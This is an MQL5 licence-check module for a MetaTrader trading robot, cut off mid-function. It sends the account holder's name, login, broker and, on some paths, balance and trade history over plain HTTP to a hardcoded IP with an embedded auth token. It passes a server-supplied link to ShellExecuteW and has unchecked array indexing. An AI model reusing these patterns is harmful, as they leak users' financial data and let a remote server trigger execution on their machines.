//+------------------------------------------------------------------+
//|                                                      Licença.mqh |
//|                                 Copyright 2024, Império dos Bots |
//|                                https://www.imperiodosbots.com.br |
//+------------------------------------------------------------------+

#property copyright "Copyright 2024, Daniel Gomes ALves"
#property link      "https://www.gtmetodo.com"
#property strict

//+------------------------------------------------------------------+
//| IMPORTA DLL                                                      |
//+------------------------------------------------------------------+

#import "user32.dll"
int MessageBoxW(int hWnd,string szText,string szCaption,int nType);
#import

#import "kernel32.dll"
int GetComputerNameW(short&lpBuffer[],uint&lpnSize);
#import

#import "wininet.dll"
int InternetOpenW(string sAgent,int lAccessType,string sProxyName="",string sProxyBypass="",int lFlags=0);
int InternetOpenUrlW(int hInternetSession,string sUrl, string sHeaders="",int lHeadersLength=0,uint lFlags=0,int lContext=0);
int InternetReadFile(int hFile,uchar & sBuffer[],int lNumBytesToRead,int& lNumberOfBytesRead);
int InternetCloseHandle(int hInet);
#import

#import "shell32.dll"
int ShellExecuteW(int hwnd,string Operation,string File,string Parameters,string Directory,int ShowCmd);
#import

//+------------------------------------------------------------------+
//| VARIÁVEIS GLOBAIS                                                |
//+------------------------------------------------------------------+

uint SZ = 250;
short BF[250];
int pc = 0;
ENUM_ACCOUNT_TRADE_MODE TM = (ENUM_ACCOUNT_TRADE_MODE)AccountInfoInteger(ACCOUNT_TRADE_MODE);
bool posAbertaLicenca = false;
bool ordPendenteLicenca = false;
string global_is_demo = "";
string global_nome_projeto = "";
string global_definir_tipo_conta = "";
string global_tipo_conta = "";
string global_definir_expiracao = "";
string global_expiracao = "";
string global_usuario = "";
string global_status = "";
string global_mt5id = "";
double lucroTotalMensal = 0.0;
double taxaDeAcertoMensalEmPorcentagem = 0.0;
double maiorLoss = 0.0;
double maiorGain = 0.0;
string language;
string typeStr;

//+------------------------------------------------------------------+
//| DEFINES                                                          |
//+------------------------------------------------------------------+

#define   CORRETORA                       AccountInfoString(ACCOUNT_COMPANY)
#define   NOME                            AccountInfoString(ACCOUNT_NAME)
#define   SERVER                          AccountInfoString(ACCOUNT_SERVER)
#define   MOEDA                           AccountInfoString(ACCOUNT_CURRENCY)
#define   __MT5ID__                       AccountInfoInteger(ACCOUNT_LOGIN)
#define   OPEN                            "open"
#define   HEADERS                         "Content-Type: application/json\r\nAuthorization: Basic "
#define   INTERNET_AGENT                  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36"
#define   INTERNET_FLAG_RELOAD            0x80000000
#define   INTERNET_FLAG_NO_CACHE_WRITE    0x04000000
#define   INTERNET_FLAG_PRAGMA_NOCACHE    0x00000100
#define   __DIR__                         __PATH__
#define   __PROJETO__                     __FILE__
#define   __COMPILE__                     __DATETIME__
#define   __VERIFICA__                    __FUNCTION__
#define   __LINHA__                       __LINE__
#define   HOST                           "http://104.198.66.85/api/"
#define   TOKEN                           "dGVzdGU6c2VuaGE="
#define   __IP__                          "IP"
#define   __PC__                          ShortArrayToString(BF)
#define   ZERO                            (0)
#define   sZERO                           "0"

//+------------------------------------------------------------------+
//| TIMESTAMP                                                        |
//+------------------------------------------------------------------+

//+------------------------------------------------------------------+
//|                                                                  |
//+------------------------------------------------------------------+
int TimeStamp()
  {
   return((int)TimeLocal());
  }

//+------------------------------------------------------------------+
//| ARRAY TO HEX                                                     |
//+------------------------------------------------------------------+

//+------------------------------------------------------------------+
//|                                                                  |
//+------------------------------------------------------------------+
string ArrayToHex(uchar &arr[],int count=-1)
  {
   string res=NULL;
   if(count<0 || count>ArraySize(arr))
      count=ArraySize(arr);
   for(int i=0; i<count; i++)
      res+=StringFormat("%.2X",arr[i]);
   return(res);
  }

//+------------------------------------------------------------------+
//| TEMPO DE EXECUÇÃO                                                |
//+------------------------------------------------------------------+

//+------------------------------------------------------------------+
//|                                                                  |
//+------------------------------------------------------------------+
int TempoDeExecucao()
  {
   return(((int)GetMicrosecondCount()/1000000));
  }

//+------------------------------------------------------------------+
//| TIPO DE CONTA                                                    |
//+------------------------------------------------------------------+

//+------------------------------------------------------------------+
//|                                                                  |
//+------------------------------------------------------------------+
string TipoDeConta()
  {
   switch(TM)
     {
      case ACCOUNT_TRADE_MODE_DEMO:
         return("DEMO");
         break;
      case ACCOUNT_TRADE_MODE_CONTEST:
         return("Competição");
         break;
      case ACCOUNT_TRADE_MODE_REAL:
         return("REAL");
         break;
      default:
         return("Erro");
         break;
     }
  }

//+------------------------------------------------------------------+
//| TESTA CONEXÃO COM A INTERNET                                     |
//+------------------------------------------------------------------+

//+------------------------------------------------------------------+
//|                                                                  |
//+------------------------------------------------------------------+
bool TestaNet()
  {
   return((bool)TerminalInfoInteger(TERMINAL_CONNECTED));
  }

//+------------------------------------------------------------------+
//| VERIFICA SE A DLL ESTÁ ATIVA                                     |
//+------------------------------------------------------------------+

//+------------------------------------------------------------------+
//|                                                                  |
//+------------------------------------------------------------------+
bool VerificaDLLestaAtiva()
  {
   return((bool)TerminalInfoInteger(TERMINAL_DLLS_ALLOWED));
  }

//+------------------------------------------------------------------+
//| Define the API function (modified to print the full URL)         |
//+------------------------------------------------------------------+

string API(const string x)
  {
   string url = HOST + x;

   int response = InternetOpenUrlW(InternetOpenW(INTERNET_AGENT, ZERO, sZERO, sZERO, ZERO), url, HEADERS + TOKEN, ZERO, INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_PRAGMA_NOCACHE | INTERNET_FLAG_RELOAD, ZERO);
   uchar ch[100];
   string dados_api = NULL;
   int bytes = -1;

   while(InternetReadFile(response, ch, 100, bytes))
     {
      if(bytes <= ZERO)
         break;
      dados_api = dados_api + CharArrayToString(ch, ZERO, bytes);
     }

   InternetCloseHandle(response);

   return(dados_api);
  }
  
//+------------------------------------------------------------------+
//| ABRE URL                                                         |
//+------------------------------------------------------------------+

void AbrirURL(string strUrl)
  {
   ShellExecuteW(ZERO,OPEN, strUrl,NULL,NULL,3);
  }

//+------------------------------------------------------------------+
//| REMOVE ROBÔ                                                      |
//+------------------------------------------------------------------+

//+------------------------------------------------------------------+
//|                                                                  |
//+------------------------------------------------------------------+
bool Remove()
  {
   ExpertRemove();
   const string n=IntegerToString(IndicatorSetString(INDICATOR_SHORTNAME,__FILE__));
   if(ChartIndicatorDelete(0,0,__FILE__) || GlobalVariablesDeleteAll(n))
      return(true);

   return(false);
  }

//+------------------------------------------------------------------+
//| MESSAGE BOX                                                      |
//+------------------------------------------------------------------+
void MensagemBox(string Titulo, string Texto, int Modo)
{
  MessageBoxW(0,Texto,Titulo,Modo);
}

//+------------------------------------------------------------------+
//| PASTE INTO THE ONINIT OR INIT FUNCTION                           |
//+------------------------------------------------------------------+
int COLAR_NA_FUNCAO_ONINIT_OU_INIT_EA(const string Verifica, const string Projeto, string __VERSAO__, ulong magic)
{
//+------------------------------------------------------------------+
//| CHECKS THE TERMINAL LANGUAGE                                     |
//+------------------------------------------------------------------+
  // Get the terminal language
  string terminal_language = TerminalInfoString(TERMINAL_LANGUAGE);

  // Define the global variable 'language' according to the terminal language
  if(StringFind(terminal_language, "English") >= 0)
  {
    language = "eng";
  }
  else if (StringFind(terminal_language, "Portuguese") >= 0)
  {
    language = "pt";
  }
  else
  {
    language = "unknown";
  }

//+------------------------------------------------------------------+
//| CHECKS FOR OPEN POSITION                                         |
//+------------------------------------------------------------------+
  posAbertaLicenca = false;
  for(int i = PositionsTotal() - 1; i >= 0; i--)
  {
    string symbol = PositionGetSymbol(i);
    ulong positionMagic = PositionGetInteger(POSITION_MAGIC);

    if(symbol == _Symbol && positionMagic == magic)
    {
      posAbertaLicenca = true;
      break;
    }
  }

//+------------------------------------------------------------------+
//| CHECKS FOR PENDING ORDER                                         |
//+------------------------------------------------------------------+

   ordPendenteLicenca = false;
   for(int i = OrdersTotal() - 1; i >= 0; i--)
     {
      ulong ticket = OrderGetTicket(i);
      string symbol = OrderGetString(ORDER_SYMBOL);
      ulong orderMagic = OrderGetInteger(ORDER_MAGIC);

      if(symbol == _Symbol && orderMagic == magic)
        {
         ordPendenteLicenca = true;
         break;
        }
     }

//+------------------------------------------------------------------+
//| RETORNA CASO TENHA POSIÇÃO ABERTA OU ORDEM PENDENTE              |
//+------------------------------------------------------------------+

   if(posAbertaLicenca || ordPendenteLicenca)
      return(INIT_SUCCEEDED);

//+------------------------------------------------------------------+
//| VERIFICA PERMISSÃO DE DLL E BIBLIOTECAS EXTERNAS                 |
//+------------------------------------------------------------------+

   if(!VerificaDLLestaAtiva())
     {
      // enviar dados log para a api de erro
      if(language == "pt")
        {
         MensagemBox("Erro de DLL! ", "É necessário permitir acesso a DLL externa. Vá até <Ferramentas><Opções><Expert Advisors (Robôs)> e marque a opção <Permitir DLL externo>", MB_ICONWARNING);
         Remove();
         return(INIT_FAILED);
        }
      else
        {
         MensagemBox("DLL Error! ", "You need to allow external DLL access. Go to <Tools><Options><Expert Advisors> and check the option <Allow DLL imports>", MB_ICONWARNING);
         Remove();
         return(INIT_FAILED);
        }
     }

   pc = GetComputerNameW(BF,SZ);

//+------------------------------------------------------------------+
//| VERIFICA SE A FUNÇÃO ESTÁ NO LUGAR CERTO                         |
//+------------------------------------------------------------------+

   if(Verifica != "OnInit" && Verifica != "Init" && Verifica != "init")
     {
      // Define mensagens conforme a linguagem do terminal
      if(language == "pt")
        {
         MensagemBox("Erro na integração do sistema em seu código!",
                     "Local da função COLAR_NA_FUNCAO_ONINIT_OU_INIT é em OnInit ou Init, não em " + Verifica + ". Corrija para obter êxito.",
                     MB_ICONWARNING);
         Remove();
         return (INIT_FAILED);
        }
      else // Inglês por padrão
        {
         MensagemBox("System integration error in your code!",
                     "Function location for COLAR_NA_FUNCAO_ONINIT_OU_INIT is in OnInit or Init, not in " + Verifica + ". Please correct it to succeed.",
                     MB_ICONWARNING);
         Remove();
         return (INIT_FAILED);
        }

     }

//+------------------------------------------------------------------+
//| VERIFICA CONEXÃO COM A INTERNET                                  |
//+------------------------------------------------------------------+

   if(!TestaNet())
     {
      // Define mensagens conforme a linguagem do terminal
      if(language == "pt")
        {
         MensagemBox("Sem conexão com a Internet!",
                     "É necessário acesso à internet. Verifique se está conectado à internet e tente novamente.",
                     MB_ICONWARNING);
        }
      else // Inglês por padrão
        {
         MensagemBox("No Internet connection!",
                     "Internet access is required. Please check your internet connection and try again.",
                     MB_ICONWARNING);
        }
     }

//+------------------------------------------------------------------+
//| ENVIA DADOS PARA SOLICITAÇÃO DO ACESSO STATUS PENDENTE           |
//+------------------------------------------------------------------+



   if(API(IntegerToString(__MT5ID__)) == "{'auth':'False'}")
     {
      string nome = NOME;
      string resposta = API("PENDENTE?mtid="+IntegerToString(__MT5ID__)+"&PROJETO="+Projeto+"&nome_usuario="+NOME+"&corretora="+CORRETORA+"&servidor="+SERVER);


      if(resposta == "{'auth':'Success'}")
        {



         //+------------------------------------------------------------------+
         //| OBTER O ID DO METATRADER                                         |
         //+------------------------------------------------------------------+

         string mt5_id = IntegerToString(__MT5ID__);

         //+------------------------------------------------------------------+
         //| OBTER O NOME DO PROJETO                                          |
         //+------------------------------------------------------------------+

         string nome_projeto = Projeto;

         //+------------------------------------------------------------------+
         //| SET THE VALUE OF THE "PAGE" PARAMETER                            |
         //+------------------------------------------------------------------+

         string page = IntegerToString(__MT5ID__);

         //+-----------------------------------------------------------------------------------------+
         //| BUILD THE PARAMETER STRING TO SEND TO THE SERVER, INCLUDING THE "PAGE" PARAMETER         |
         //+-----------------------------------------------------------------------------------------+

         string parametros_projeto = StringFormat("?mtid=%d&projeto=%s&page=%s", mt5_id, nome_projeto, page);

         //+------------------------------------------------------------------+
         //| SEND DATA TO THE SERVER                                          |
         //+------------------------------------------------------------------+

         string api_resposta = API(parametros_projeto);

         API(parametros_projeto);

         if(StringLen(api_resposta) > 0)
           {
            const string Sep=";";
            ushort Uchar;
            string Res[];
            Uchar = StringGetCharacter(Sep,0);
            int Tam = StringSplit(api_resposta,Uchar,Res);

            if(Tam >= 0)
              {
               const string MENSAGEM = Res[0];
               const string MENSAGEM_USUARIO = Res[1];
               const string ATUALIZAR = Res[4];
               const double VERSAO = (double)Res[5];
               const string MSG_ATUALIZAR = Res[6];
               const string LINK_ATUALIZAR = Res[7];
               const string NOME_ARQUIVO = Res[8];
               const string STATUS = Res[10];
               const string MT5_ID = Res[11];
               const string ATIVAR_NOME_USUARIO = Res[12];
               const string NOME_USUARIO = Res[13];
               const string IS_DEMO =  Res[19];
               const string NOME_EA_AUTORIZADO =  Res[20];


               global_is_demo = IS_DEMO;
               
               
               // Envia mensagem a todos os clientes
              if(MENSAGEM == "on")
                {
                  if(language == "pt")
                    {
                    MensagemBox("Mensagem importante!", MENSAGEM_USUARIO, MB_ICONWARNING);
                    }
                  else // Inglês por padrão
                    {
                    MensagemBox("Important message!", MENSAGEM_USUARIO, MB_ICONWARNING);
                    }
                }

              // Check original file name
              if(Projeto != NOME_ARQUIVO)
                {
                  if(language == "pt")
                    {
                    // Enviar dados log para a api de erro com hora e data, ip, motivo do erro, tipo=grave
                    MensagemBox("Arquivo possivelmente fraudado!", "Erro com os dados originais de nome do arquivo.", MB_ICONERROR);
                    }
                  else // Inglês por padrão
                    {
                    // Enviar dados log para a api de erro com hora e data, ip, motivo do erro, tipo=grave
                    Print("Error with original file name data. (1)");
                    MensagemBox("Wrong file!", "Error with original file name data.", MB_ICONERROR);
                    }

                  Remove();
                }


         // Verificar versão
         if((double)__VERSAO__ != (double)VERSAO)
           {
            if(ATUALIZAR == "on")
              {
               if(language == "pt")
                 {
                  MensagemBox("Atualização disponível!", MSG_ATUALIZAR, MB_ICONWARNING);
                 }
               else // Inglês por padrão
                 {
                  MensagemBox("Update available!", MSG_ATUALIZAR, MB_ICONWARNING);
                 }

               AbrirURL(LINK_ATUALIZAR);
               Remove();

              }
           }


               

               // Dados do usuário recebidos do MetaTrader
               string usuarioData = NOME_EA_AUTORIZADO;  // Exemplo de dados recebidos

               // Dividir a string em partes individuais usando vírgulas como delimitador
               string dados_ea[];
               ArrayResize(dados_ea, 0);
               StringSplit(usuarioData, ',', dados_ea);

               // Nome do projeto a ser verificado
               string nome_projeto = dados_ea[0];  // O primeiro elemento é o nome do projeto

               // Variável para verificar se o acesso é autorizado
               bool acesso_autorizado = false;

               // Verificar se há dados suficientes para representar um EA completo (nome, definir_tipo_conta, tipo_conta, definir_expiracao, expiracao)
               if(ArraySize(dados_ea) >= 5)
                 {
                  // Iterar sobre os EAs recebidos para encontrar o correspondente ao nome do projeto
                  for(int i = 0; i < ArraySize(dados_ea); i += 5)
                    {
                     string nome_ea = dados_ea[i];
                     string definir_tipo_conta = dados_ea[i + 1];
                     string tipo_conta = dados_ea[i + 2];
                     string definir_expiracao = dados_ea[i + 3];
                     string expiracao = dados_ea[i + 4];

                     // Verificar se o nome do projeto corresponde ao EA atual
                     if(nome_ea == nome_projeto)
                       {
                        // Autorizar o acesso e exibir os dados do EA
                        acesso_autorizado = true;
                        global_nome_projeto = nome_projeto;
                        global_definir_tipo_conta = definir_tipo_conta;
                        global_tipo_conta = tipo_conta;
                        global_definir_expiracao = definir_expiracao;
                        global_expiracao = expiracao;
                        break;  // Se encontrou uma correspondência, não é necessário continuar verificando
                       }
                    }
                 }

              }


           }



         if(global_is_demo == "1")
           {
            // ativar e desativar expiração
            if(global_definir_expiracao == "on")
              {
               const string expiracao_api = global_expiracao;
               const string Sepa = "-";
               ushort Uchar_;
               string Res_[];
               Uchar_ = StringGetCharacter(Sepa,0);
               int Tam_ = StringSplit(expiracao_api,Uchar_,Res_);

               if(Tam_ == 3)
                 {
                  string EXPIRACAO_ = Res_[2]+"."+Res_[1]+"."+Res_[0]+" 00:00:00";
                  datetime EXP = StringToTime(EXPIRACAO_);
                  int expstamp = (int)EXP;
                  int dif = expstamp - TimeStamp();

                  if(dif <= 0)
                    {
                     // Define mensagens conforme a linguagem do terminal
                     if(language == "pt")
                       {
                        MensagemBox("Licença expirada!",
                                    "Período de acesso para sua licença expirou. Renove sua licença para voltar a usar a ferramenta.",
                                    MB_ICONERROR);
                        AbrirURL("https://t.me/elon888musk");
                        Remove();
                        return (INIT_FAILED);
                       }
                     else // Inglês por padrão
                       {
                        MensagemBox("License expired!",
                                    "Access period for your license has expired. Please renew your license to continue using the tool.",
                                    MB_ICONERROR);
                        AbrirURL("https://t.me/elon888musk");
                        Remove();

                        return (INIT_FAILED);
                       }

                    }

                 }
              }

            // Exibe mensagem para robo demo ativado por 7 dias
            if(language == "pt")
              {
               MensagemBox("Administrador: ", "Robô de TESTE ativado por 7 dias. Recarregue o EA no gráfico", MB_ICONWARNING);
               Remove();
               return (INIT_FAILED);
              }
            else // Inglês por padrão
              {
               MensagemBox("Administrator: ", "TEST robot activated for 7 days. Put the EA back on the chart!", MB_ICONWARNING);
               Remove();
               return (INIT_FAILED);
              }



           }
         else
           {
            // enviar dados log para a api de erro
            if(language == "pt")
              {
               MensagemBox("ADMIN", "Entre em contato com o suporte para ativar sua licença! Uma página será aberta para contato direto com o suporte. ", MB_ICONWARNING);
               AbrirURL("https://t.me/elon888musk");
               Remove();
              }
            else // Inglês por padrão
              {
               MensagemBox("ADMIN", "Contact support to activate your license! A page will be opened for direct contact with support. ", MB_ICONWARNING);
               AbrirURL("https://t.me/elon888musk");
               Remove();
              }

           }
        }
      else
        {
         if(language == "pt")
           {
            MensagemBox("Administrador: ", "Erro ao enviar dados para solicitação de acesso. Entre em contato com o suporte.", MB_ICONWARNING);
            Remove();
           }
         else // Inglês por padrão
           {
            MensagemBox("Administrator: ", "Error sending data for access request. Please contact support.", MB_ICONWARNING);
            Remove();
           }



        }


      return(INIT_FAILED);

     }


//+------------------------------------------------------------------+
//| ENVIA DADOS DO CLIENTE PARA ACESSO AO ROBÔ TESTE                 |
//+------------------------------------------------------------------+

//+------------------------------------------------------------------+
//| OBTER O ID DO METATRADER                                         |
//+------------------------------------------------------------------+

   string mt5_id = IntegerToString(__MT5ID__);

//+------------------------------------------------------------------+
//| OBTER O NOME DO PROJETO                                          |
//+------------------------------------------------------------------+

   string nome_projeto = Projeto;

//+------------------------------------------------------------------+
//| DEFINIR O VALOR DO PARÂMETRO "PAGE"                              |
//+------------------------------------------------------------------+

   string page = IntegerToString(__MT5ID__);

//+-----------------------------------------------------------------------------------------+
//| CONSTRUIR A STRING DE PARÂMETROS PARA ENVIAR AO SERVIDOR, INCLUINDO O PARÂMETRO "PAGE"  |
//+-----------------------------------------------------------------------------------------+

   string parametros_projeto = StringFormat("?mtid=%d&projeto=%s&page=%s", mt5_id, nome_projeto, page);



   if(API(IntegerToString(__MT5ID__)) == "{'auth':'False'}")
     {
      string nome = NOME;
      string resposta = API("PENDENTE?mtid="+IntegerToString(__MT5ID__)+"&PROJETO="+Projeto+"&nome_usuario="+NOME+"&corretora="+CORRETORA+"&servidor="+SERVER);




      if(resposta == "{'auth':'Success'}")
        {


         //+------------------------------------------------------------------+
         //| ENVIAR OS DADOS PARA O SERVIDOR                                  |
         //+------------------------------------------------------------------+

         string api_resposta = API(parametros_projeto);

         API(parametros_projeto);

         if(StringLen(api_resposta) > 0)
           {
            const string Sep=";";
            ushort Uchar;
            string Res[];
            Uchar = StringGetCharacter(Sep,0);
            int Tam = StringSplit(api_resposta,Uchar,Res);

            if(Tam >= 0)
              {
               const string MENSAGEM = Res[0];
               const string MENSAGEM_USUARIO = Res[1];
               const string ATUALIZAR = Res[4];
               const double VERSAO = (double)Res[5];
               const string MSG_ATUALIZAR = Res[6];
               const string LINK_ATUALIZAR = Res[7];
               const string NOME_ARQUIVO = Res[8];
               const string STATUS = Res[10];
               const string MT5_ID = Res[11];
               const string ATIVAR_NOME_USUARIO = Res[12];
               const string NOME_USUARIO = Res[13];
               const string IS_DEMO =  Res[19];
               const string NOME_EA_AUTORIZADO =  Res[20];


               global_is_demo = IS_DEMO;
               
               
                        // Envia mensagem a todos os clientes
         if(MENSAGEM == "on")
           {
            if(language == "pt")
              {
               MensagemBox("Mensagem importante!", MENSAGEM_USUARIO, MB_ICONWARNING);
              }
            else // Inglês por padrão
              {
               MensagemBox("Important message!", MENSAGEM_USUARIO, MB_ICONWARNING);
              }
           }


         // Verificar nome original do arquivo
         if(Projeto != NOME_ARQUIVO)
           {
            if(language == "pt")
              {
               // Enviar dados log para a api de erro com hora e data, ip, motivo do erro, tipo=grave
               MensagemBox("Arquivo possivelmente fraudado!", "Erro com os dados originais de nome do arquivo.", MB_ICONERROR);
              }
            else // Inglês por padrão
              {
               // Enviar dados log para a api de erro com hora e data, ip, motivo do erro, tipo=grave
               Print("Error with original file name data. (2)");
               MensagemBox("Wrong file!", "Error with original file name data.", MB_ICONERROR);
              }

            Remove();

           }


         // Verificar versão
         if((double)__VERSAO__ != (double)VERSAO)
           {
            if(ATUALIZAR == "on")
              {
               if(language == "pt")
                 {
                  MensagemBox("Atualização disponível!", MSG_ATUALIZAR, MB_ICONWARNING);
                 }
               else // Inglês por padrão
                 {
                  MensagemBox("Update available!", MSG_ATUALIZAR, MB_ICONWARNING);
                 }

               AbrirURL(LINK_ATUALIZAR);
               Remove();

              }
           }


               

               // Dados do usuário recebidos do MetaTrader
               string usuarioData = NOME_EA_AUTORIZADO;  // Exemplo de dados recebidos

               // Dividir a string em partes individuais usando vírgulas como delimitador
               string dados_ea[];
               ArrayResize(dados_ea, 0);
               StringSplit(usuarioData, ',', dados_ea);

               // Nome do projeto a ser verificado
               string nome_projeto = dados_ea[0];  // O primeiro elemento é o nome do projeto

               // Variável para verificar se o acesso é autorizado
               bool acesso_autorizado = false;

               // Verificar se há dados suficientes para representar um EA completo (nome, definir_tipo_conta, tipo_conta, definir_expiracao, expiracao)
               if(ArraySize(dados_ea) >= 5)
                 {
                  // Iterar sobre os EAs recebidos para encontrar o correspondente ao nome do projeto
                  for(int i = 0; i < ArraySize(dados_ea); i += 5)
                    {
                     string nome_ea = dados_ea[i];
                     string definir_tipo_conta = dados_ea[i + 1];
                     string tipo_conta = dados_ea[i + 2];
                     string definir_expiracao = dados_ea[i + 3];
                     string expiracao = dados_ea[i + 4];

                     // Verificar se o nome do projeto corresponde ao EA atual
                     if(nome_ea == nome_projeto)
                       {
                        // Autorizar o acesso e exibir os dados do EA
                        acesso_autorizado = true;
                        global_nome_projeto = nome_projeto;
                        global_definir_tipo_conta = definir_tipo_conta;
                        global_tipo_conta = tipo_conta;
                        global_definir_expiracao = definir_expiracao;
                        global_expiracao = expiracao;
                        break;  // Se encontrou uma correspondência, não é necessário continuar verificando
                       }
                    }
                 }

              }


           }



         if(global_is_demo == "1")
           {
            // ativar e desativar expiração
            if(global_definir_expiracao == "on")
              {
               const string expiracao_api = global_expiracao;
               const string Sepa = "-";
               ushort Uchar_;
               string Res_[];
               Uchar_ = StringGetCharacter(Sepa,0);
               int Tam_ = StringSplit(expiracao_api,Uchar_,Res_);

               if(Tam_ == 3)
                 {
                  string EXPIRACAO_ = Res_[2]+"."+Res_[1]+"."+Res_[0]+" 00:00:00";
                  datetime EXP = StringToTime(EXPIRACAO_);
                  int expstamp = (int)EXP;
                  int dif = expstamp - TimeStamp();

                  if(dif <= 0)
                    {
                     if(language == "pt")
                       {
                        MensagemBox("Licença expirada!",
                                    "Período de acesso para sua licença expirou. Renove sua licença para voltar a usar a ferramenta.",
                                    MB_ICONERROR);

                        AbrirURL("https://t.me/elon888musk");
                        Remove();
                        Remove();
                        return (INIT_FAILED);
                       }
                     else // Inglês por padrão
                       {
                        MensagemBox("License expired!",
                                    "Access period for your license has expired. Please renew your license to continue using the tool.",
                                    MB_ICONERROR);

                        AbrirURL("https://t.me/elon888musk");
                        Remove();
                        Remove();
                        return (INIT_FAILED);
                       }


                    }

                 }
              }





            if(language == "pt")
              {
               MensagemBox("Administrador: ", "Robô de TESTE ativado por 7 dias. Recarregue o EA no gráfico!", MB_ICONWARNING);
               

               //+-----------------------------------------------------------------------------+
               //| ENVIAR RESULTADOS PARA O DASHBOARD (SE PESAR O EA, ISSO DEVE SER RETIRADO)  |
               //+-----------------------------------------------------------------------------+

               DadosMensaisDoHistorico();

               // Dados para enviar
               double saldo_normalizado = NormalizeDouble(GetSaldo(), 2);
               double resultado_do_dia = NormalizeDouble(ResultadoDoDia(), 2);
               double resultado_da_semana = NormalizeDouble(ResultadoDaSemana(), 2);
               double lucro_total = NormalizeDouble(lucroTotalMensal, 2);
               double taxa_acerto = NormalizeDouble(taxaDeAcertoMensalEmPorcentagem, 2);
               double maior_loss = NormalizeDouble(maiorLoss, 2);
               double maior_gain = NormalizeDouble(maiorGain, 2);
               string resultados_mensais = ObterResultadosMensais();
               string historico = GetHistoricoFormatado(); // Assumindo que Historico() retorna o histórico formatado conforme desejado

               // Variáveis da corretora, servidor e moeda da conta
               string corretora = AccountInfoString(ACCOUNT_COMPANY);
               string servidor = AccountInfoString(ACCOUNT_SERVER);
               string moeda_conta = AccountInfoString(ACCOUNT_CURRENCY);

               // Construir a string de parâmetros para enviar para o servidor
               string parametros = StringFormat("?mtid=%d&saldo=%.2f&resultado_do_dia=%.2f&resultado_da_semana=%.2f&lucro_total=%.2f&taxa_acerto=%.2f&maior_loss_diario=%.2f&maior_gain_diario=%.2f&resultados_mensais=%s&historico=%s&corretora=%s&servidor=%s&moeda_conta=%s",
                                                __MT5ID__,
                                                saldo_normalizado,
                                                resultado_do_dia, resultado_da_semana,
                                                lucro_total, taxa_acerto,
                                                maior_loss, maior_gain,
                                                resultados_mensais, historico,
                                                corretora, servidor,
                                                moeda_conta);


               // Enviar os dados para o servidor
               string resposta = API(parametros);
Remove();
               return (INIT_FAILED);
              }
            else
              {
               MensagemBox("Administrator: ", "TEST robot activated for 7 days. Put the EA back on the chart!", MB_ICONWARNING);

               //+-----------------------------------------------------------------------------+
               //| ENVIAR RESULTADOS PARA O DASHBOARD (SE PESAR O EA, ISSO DEVE SER RETIRADO)  |
               //+-----------------------------------------------------------------------------+

               DadosMensaisDoHistorico();

               // Dados para enviar
               double saldo_normalizado = NormalizeDouble(GetSaldo(), 2);
               double resultado_do_dia = NormalizeDouble(ResultadoDoDia(), 2);
               double resultado_da_semana = NormalizeDouble(ResultadoDaSemana(), 2);
               double lucro_total = NormalizeDouble(lucroTotalMensal, 2);
               double taxa_acerto = NormalizeDouble(taxaDeAcertoMensalEmPorcentagem, 2);
               double maior_loss = NormalizeDouble(maiorLoss, 2);
               double maior_gain = NormalizeDouble(maiorGain, 2);
               string resultados_mensais = ObterResultadosMensais();
               string historico = GetHistoricoFormatado(); // Assumindo que Historico() retorna o histórico formatado conforme desejado

               // Variáveis da corretora, servidor e moeda da conta
               string corretora = AccountInfoString(ACCOUNT_COMPANY);
               string servidor = AccountInfoString(ACCOUNT_SERVER);
               string moeda_conta = AccountInfoString(ACCOUNT_CURRENCY);

               // Construir a string de parâmetros para enviar para o servidor
               string parametros = StringFormat("?mtid=%d&saldo=%.2f&resultado_do_dia=%.2f&resultado_da_semana=%.2f&lucro_total=%.2f&taxa_acerto=%.2f&maior_loss_diario=%.2f&maior_gain_diario=%.2f&resultados_mensais=%s&historico=%s&corretora=%s&servidor=%s&moeda_conta=%s",
                                                __MT5ID__,
                                                saldo_normalizado,
                                                resultado_do_dia, resultado_da_semana,
                                                lucro_total, taxa_acerto,
                                                maior_loss, maior_gain,
                                                resultados_mensais, historico,
                                                corretora, servidor,
                                                moeda_conta);


               // Enviar os dados para o servidor
               string resposta = API(parametros);
Remove();
               return (INIT_FAILED);
              }

           }
         else
           {
            if(language == "pt")
              {
               MensagemBox("AMDIN", "Entre em contato com o suporte para ativar sua licença! Uma página será aberta para contato direto com o suporte. ", MB_ICONWARNING);
               AbrirURL("https://t.me/elon888musk");
               Remove();
               return (INIT_FAILED);
              }
            else // Inglês por padrão
              {
               MensagemBox("ADMIN", "Contact support to activate your license! A page will be opened for direct contact with support. ", MB_ICONWARNING);
               AbrirURL("https://t.me/elon888musk");
               Remove();
               return (INIT_FAILED);
              }


           }
        }
      else
        {
         // Exibir mensagem de erro geral
         if(language == "pt")
           {
            MensagemBox("Administrador: ", "Erro ao enviar dados para solicitação de acesso. Entre em contato com o suporte.", MB_ICONWARNING);
            Remove();
            return (INIT_FAILED);
           }
         else // Inglês por padrão
           {
            MensagemBox("Administrator: ", "Error sending data for access request. Please contact support.", MB_ICONWARNING);
            Remove();
            return (INIT_FAILED);
           }



        }

      return(INIT_FAILED);

     }

//+------------------------------------------------------------------+
//|REGISTER TEST FOR EXISTING USER                                   |
//+------------------------------------------------------------------+
  
    string api_resposta = API(parametros_projeto);

    #ifdef DEBUG
      Print("API parameters: " + parametros_projeto + "\nAPI response: " + api_resposta);
    #endif

    API(parametros_projeto);

    if(StringLen(api_resposta) > 0)
    {
      const string Sep=";";
      ushort Uchar;
      string Res[];
      Uchar = StringGetCharacter(Sep,0);
      int Tam = StringSplit(api_resposta, Uchar, Res);

      if(Tam >= 0)
      {
        const string MENSAGEM = Res[0];
        const string MENSAGEM_USUARIO = Res[1];
        const string ATUALIZAR = Res[4];
        const double VERSAO = (double)Res[5];
        const string MSG_ATUALIZAR = Res[6];
        const string LINK_ATUALIZAR = Res[7];
        const string NOME_ARQUIVO = Res[8];   // Name of the project file
        const string STATUS = Res[10];
        const string MT5_ID = Res[11];
        const string ATIVAR_NOME_USUARIO = Res[12];
        const string NOME_USUARIO = Res[13];
        const string IS_DEMO =  Res[19];
        const string NOME_EA_AUTORIZADO =  Res[20];
        global_is_demo = IS_DEMO;

        // Send message to all clients
        if(MENSAGEM == "on")
        {
          if(language == "pt")
          {
            MensagemBox("Mensagem importante!", MENSAGEM_USUARIO, MB_ICONWARNING);
          }
          else // Inglês por padrão
          {
            MensagemBox("Important message!", MENSAGEM_USUARIO, MB_ICONWARNING);
          }
        }

        // Check original file name
